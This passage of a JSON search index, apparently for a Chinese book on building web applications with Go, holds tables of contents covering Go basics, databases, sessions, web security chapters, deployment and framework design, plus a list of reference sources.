<li>Socket\u7f16\u7a0b</li> <li>WebSocket</li> <li>REST</li> <li>RPC</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>\u5b89\u5168\u4e0e\u52a0\u5bc6<ul> <li>\u9884\u9632CSRF\u653b\u51fb</li> <li>\u786e\u4fdd\u8f93\u5165\u8fc7\u6ee4</li> <li>\u907f\u514dXSS\u653b\u51fb</li> <li>\u907f\u514dSQL\u6ce8\u5165</li> <li>\u5b58\u50a8\u5bc6\u7801</li> <li>\u52a0\u5bc6\u548c\u89e3\u5bc6\u6570\u636e</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>\u56fd\u9645\u5316\u548c\u672c\u5730\u5316 <ul> <li>\u8bbe\u7f6e\u9ed8\u8ba4\u5730\u533a</li> <li>\u672c\u5730\u5316\u8d44\u6e90</li> <li>\u56fd\u9645\u5316\u7ad9\u70b9</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>\u9519\u8bef\u5904\u7406\uff0c\u8c03\u8bd5\u548c\u6d4b\u8bd5<ul> <li>\u9519\u8bef\u5904\u7406</li> <li>\u4f7f\u7528GDB\u8c03\u8bd5</li> <li>Go\u600e\u4e48\u5199\u6d4b\u8bd5\u7528\u4f8b</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>\u90e8\u7f72\u4e0e\u7ef4\u62a4<ul> <li>\u5e94\u7528\u65e5\u5fd7</li> <li>\u7f51\u7ad9\u9519\u8bef\u5904\u7406</li> <li>\u5e94\u7528\u90e8\u7f72</li> <li>\u5907\u4efd\u548c\u6062\u590d</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>\u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2aWeb\u6846\u67b6 <ul> <li>\u9879\u76ee\u89c4\u5212 </li> <li>\u81ea\u5b9a\u4e49\u8def\u7531\u5668\u8bbe\u8ba1</li> <li>controller\u8bbe\u8ba1</li> <li>\u65e5\u5fd7\u548c\u914d\u7f6e\u8bbe\u8ba1</li> <li>\u5b9e\u73b0\u535a\u5ba2\u7684\u589e\u5220\u6539</li> <li>\u5c0f\u7ed3 </li> </ul> </li> <li>\u6269\u5c55Web\u6846\u67b6<ul> <li>\u9759\u6001\u6587\u4ef6\u652f\u6301</li> <li>Session\u652f\u6301</li> <li>\u8868\u5355\u652f\u6301</li> <li>\u7528\u6237\u8ba4\u8bc1</li> <li>\u591a\u8bed\u8a00\u652f\u6301</li> <li>pprof\u652f\u6301</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>\u53c2\u8003\u8d44\u6599</li> </ul>"},{"location":"preface/","title":"Preface","text":"<ul> <li> <p>1.Go\u73af\u5883\u914d\u7f6e</p> <ul> <li>1.1. \u5b89\u88c5Go</li> <li>1.2. GOPATH \u4e0e\u5de5\u4f5c\u7a7a\u95f4</li> <li>1.3. Go \u547d\u4ee4</li> <li>1.4. Go\u5f00\u53d1\u5de5\u5177</li> <li>1.5. \u5c0f\u7ed3</li> </ul> </li> <li> <p>2.Go\u8bed\u8a00\u57fa\u7840</p> <ul> <li>2.1. \u4f60\u597d\uff0cGo</li> <li>2.2. Go\u57fa\u7840</li> <li>2.3. \u6d41\u7a0b\u548c\u51fd\u6570</li> <li>2.4. struct</li> <li>2.5. \u9762\u5411\u5bf9\u8c61</li> <li>2.6. interface</li> <li>2.7. \u5e76\u53d1</li> <li>2.8. \u5c0f\u7ed3</li> </ul> </li> <li> <p>3.Web\u57fa\u7840</p> <ul> <li>3.1 web\u5de5\u4f5c\u65b9\u5f0f</li> <li>3.2 Go\u642d\u5efa\u4e00\u4e2a\u7b80\u5355\u7684web\u670d\u52a1</li> <li>3.3 Go\u5982\u4f55\u4f7f\u5f97web\u5de5\u4f5c</li> <li>3.4 Go\u7684http\u5305\u8be6\u89e3</li> <li>3.5 \u5c0f\u7ed3</li> </ul> </li> <li> <p>4.\u8868\u5355</p> <ul> <li>4.1 \u5904\u7406\u8868\u5355\u7684\u8f93\u5165</li> <li>4.2 \u9a8c\u8bc1\u8868\u5355\u7684\u8f93\u5165</li> <li>4.3 \u9884\u9632\u8de8\u7ad9\u811a\u672c</li> <li>4.4 \u9632\u6b62\u591a\u6b21\u9012\u4ea4\u8868\u5355</li> <li>4.5 \u5904\u7406\u6587\u4ef6\u4e0a\u4f20</li> <li>4.6 \u5c0f\u7ed3</li> </ul> </li> <li> <p>5.\u8bbf\u95ee\u6570\u636e\u5e93</p> <ul> <li>5.1 database/sql\u63a5\u53e3</li> <li>5.2 \u4f7f\u7528MySQL\u6570\u636e\u5e93</li> <li>5.3 \u4f7f\u7528SQLite\u6570\u636e\u5e93</li> <li>5.4 \u4f7f\u7528PostgreSQL\u6570\u636e\u5e93</li> <li>5.5 \u4f7f\u7528Beego orm\u5e93\u8fdb\u884cORM\u5f00\u53d1</li> <li>5.6 NOSQL\u6570\u636e\u5e93\u64cd\u4f5c</li> <li>5.7 \u5c0f\u7ed3</li> </ul> </li> <li> <p>6.session\u548c\u6570\u636e\u5b58\u50a8</p> <ul> <li>6.1 session\u548ccookie</li> <li>6.2 Go\u5982\u4f55\u4f7f\u7528session</li> <li>6.3 session\u5b58\u50a8</li> <li>6.4 \u9884\u9632session\u52ab\u6301 </li> <li>6.5 \u5c0f\u7ed3</li> </ul> </li> <li> <p>7.\u6587\u672c\u6587\u4ef6\u5904\u7406</p> <ul> <li>7.1 XML\u5904\u7406</li> <li>7.2 JSON\u5904\u7406 </li> <li>7.3 \u6b63\u5219\u5904\u7406</li> <li>7.4 \u6a21\u677f\u5904\u7406</li> <li>7.5 \u6587\u4ef6\u64cd\u4f5c</li> <li>7.6 \u5b57\u7b26\u4e32\u5904\u7406</li> <li>7.7 \u5c0f\u7ed3</li> </ul> </li> <li> <p>8.Web\u670d\u52a1</p> <ul> <li>8.1 Socket\u7f16\u7a0b</li> <li>8.2 WebSocket</li> <li>8.3 REST</li> <li>8.4 RPC</li> <li>8.5 \u5c0f\u7ed3</li> </ul> </li> <li> <p>9.\u5b89\u5168\u4e0e\u52a0\u5bc6</p> <ul> <li>9.1 \u9884\u9632CSRF\u653b\u51fb</li> <li>9.2 \u786e\u4fdd\u8f93\u5165\u8fc7\u6ee4</li> <li>9.3 \u907f\u514dXSS\u653b\u51fb</li> <li>9.4 \u907f\u514dSQL\u6ce8\u5165</li> <li>9.5 \u5b58\u50a8\u5bc6\u7801</li> <li>9.6 \u52a0\u5bc6\u548c\u89e3\u5bc6\u6570\u636e</li> <li>9.7 \u5c0f\u7ed3</li> </ul> </li> <li> <p>10.\u56fd\u9645\u5316\u548c\u672c\u5730\u5316 </p> <ul> <li>10.1 \u8bbe\u7f6e\u9ed8\u8ba4\u5730\u533a</li> <li>10.2 \u672c\u5730\u5316\u8d44\u6e90</li> <li>10.3 \u56fd\u9645\u5316\u7ad9\u70b9</li> <li>10.4 \u5c0f\u7ed3</li> </ul> </li> <li> <p>11.\u9519\u8bef\u5904\u7406\uff0c\u8c03\u8bd5\u548c\u6d4b\u8bd5</p> <ul> <li>11.1 \u9519\u8bef\u5904\u7406</li> <li>11.2 \u4f7f\u7528GDB\u8c03\u8bd5</li> <li>11.3 Go\u600e\u4e48\u5199\u6d4b\u8bd5\u7528\u4f8b</li> <li>11.4 \u5c0f\u7ed3</li> </ul> </li> <li> <p>12.\u90e8\u7f72\u4e0e\u7ef4\u62a4</p> <ul> <li>12.1 \u5e94\u7528\u65e5\u5fd7</li> <li>12.2 \u7f51\u7ad9\u9519\u8bef\u5904\u7406</li> <li>12.3 \u5e94\u7528\u90e8\u7f72</li> <li>12.4 \u5907\u4efd\u548c\u6062\u590d</li> <li>12.5 \u5c0f\u7ed3</li> </ul> </li> <li> <p>13.\u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2aWeb\u6846\u67b6 </p> <ul> <li>13.1 \u9879\u76ee\u89c4\u5212 </li> <li>13.2 \u81ea\u5b9a\u4e49\u8def\u7531\u5668\u8bbe\u8ba1</li> <li>13.3 controller\u8bbe\u8ba1</li> <li>13.4 \u65e5\u5fd7\u548c\u914d\u7f6e\u8bbe\u8ba1</li> <li>13.5 \u5b9e\u73b0\u535a\u5ba2\u7684\u589e\u5220\u6539</li> <li>13.6 \u5c0f\u7ed3 </li> </ul> </li> <li> <p>14.\u6269\u5c55Web\u6846\u67b6</p> <ul> <li>14.1 \u9759\u6001\u6587\u4ef6\u652f\u6301</li> <li>14.2 Session\u652f\u6301</li> <li>14.3 \u8868\u5355\u652f\u6301</li> <li>14.4 \u7528\u6237\u8ba4\u8bc1</li> <li>14.5 \u591a\u8bed\u8a00\u652f\u6301</li> <li>14.6 pprof\u652f\u6301</li> <li>14.7 \u5c0f\u7ed3</li> </ul> </li> <li> <p>\u9644\u5f55A \u53c2\u8003\u8d44\u6599</p> </li> </ul>"},{"location":"ref/","title":"\u9644\u5f55A \u53c2\u8003\u8d44\u6599","text":"<p>\u8fd9\u672c\u4e66\u7684\u5185\u5bb9\u57fa\u672c\u4e0a\u662f\u6211\u5b66\u4e60Go\u8fc7\u7a0b\u4ee5\u53ca\u4ee5\u524d\u4ece\u4e8bWeb\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e9b\u7ecf\u9a8c\u603b\u7ed3\uff0c\u91cc\u9762\u90e8\u5206\u5185\u5bb9\u53c2\u8003\u4e86\u5f88\u591a\u7ad9\u70b9\u7684\u5185\u5bb9\uff0c\u611f\u8c22\u8fd9\u4e9b\u7ad9\u70b9\u7684\u5185\u5bb9\u8ba9\u6211\u80fd\u591f\u603b\u7ed3\u51fa\u6765\u8fd9\u672c\u4e66\uff0c\u53c2\u8003\u8d44\u6599\u5982\u4e0b\uff1a</p> <ol> <li>golang blog</li> <li>Russ Cox blog</li> <li>go book</li> <li>golangtutorials</li> <li>\u8f69\u8109\u5203de\u5200\u5149\u5251\u5f71</li> <li>Go \u5b98\u7f51\u6587\u6863</li> <li>Network programming with Go</li> <li>setup-the-rails-application-for-internationalization</li> <li>The Cross-Site Scripting (XSS) FAQ</li> <li>Network programming with Go</li> <li>RESTful</li> </ol>"}]}